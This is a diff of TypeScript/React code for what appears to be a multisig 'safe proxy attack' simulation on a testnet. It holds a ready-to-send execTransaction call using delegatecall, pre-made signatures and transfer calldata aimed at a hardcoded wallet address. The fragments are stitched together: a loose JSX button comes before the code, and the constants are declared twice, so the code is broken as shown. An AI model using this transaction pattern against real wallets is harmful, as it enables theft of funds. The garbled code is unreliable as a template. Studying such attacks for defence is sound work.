@@ -1,0 +1,61 @@
+<button
+  onClick={executeAttack}
+  disabled={simulationCompleted}
+  className={`px-4 py-2 ${simulationCompleted ? 'bg-gray-400 cursor-not-allowed' : 'bg-blue-500 hover:bg-blue-600'} text-white rounded transition-colors`}
+>
+  {t.safeProxyAttack.step2.executeButton}
+</button>
+
+const TARGET_ADDRESS = '0xdFf38933CC5f46aAe55CC1d9D454492Ae96C5cBa';
+
+const signatures =
+  "0xd0afef78a52fd504479dc2af3dc401334762cbd05609c7ac18db9ec5abf4a07a5cc09fc86efd3489707b89b0c729faed616459189cb50084f208d03b201b001f1f";
+
+const data =
+  "0xa9059cbb000000000000000000000000bdd077f651ebe7f7b3ce16fe5f2b025be29695160000000000000000000000000000000000000000000000000000000000000000";
+
+const TARGET_ADDRESS = '0xdFf38933CC5f46aAe55CC1d9D454492Ae96C5cBa';
+
+const signatures =
+  "0xd0afef78a52fd504479dc2af3dc401334762cbd05609c7ac18db9ec5abf4a07a5cc09fc86efd3489707b89b0c729faed616459189cb50084f208d03b201b001f1f";
+
+const data =
+  "0xa9059cbb000000000000000000000000bdd077f651ebe7f7b3ce16fe5f2b025be29695160000000000000000000000000000000000000000000000000000000000000000";
+
+await writeContractAsync({
+  address: TARGET_ADDRESS as `0x${string}`,
+  abi: [{
+    type: 'function',
+    name: 'execTransaction',
+    inputs: [
+      { name: 'to', type: 'address' },
+      { name: 'value', type: 'uint256' },
+      { name: 'data', type: 'bytes' },
+      { name: 'operation', type: 'uint8' },
+      { name: 'safeTxGas', type: 'uint256' },
+      { name: 'baseGas', type: 'uint256' },
+      { name: 'gasPrice', type: 'uint256' },
+      { name: 'gasToken', type: 'address' },
+      { name: 'refundReceiver', type: 'address' },
+      { name: 'signatures', type: 'bytes' }
+    ],
+    outputs: [{ type: 'bool' }],
+    stateMutability: 'nonpayable'
+  }],
+  functionName: 'execTransaction',
+  args: [
+    TARGET_ADDRESS as `0x${string}`,
+    0n,
+    data as `0x${string}`,
+    1,
+    45746n,
+    0n,
+    0n,
+    '0x0000000000000000000000000000000000000000',
+    '0x0000000000000000000000000000000000000000',
+    signatures as `0x${string}`
+  ],
+  chainId: holesky.id
+});
+
+
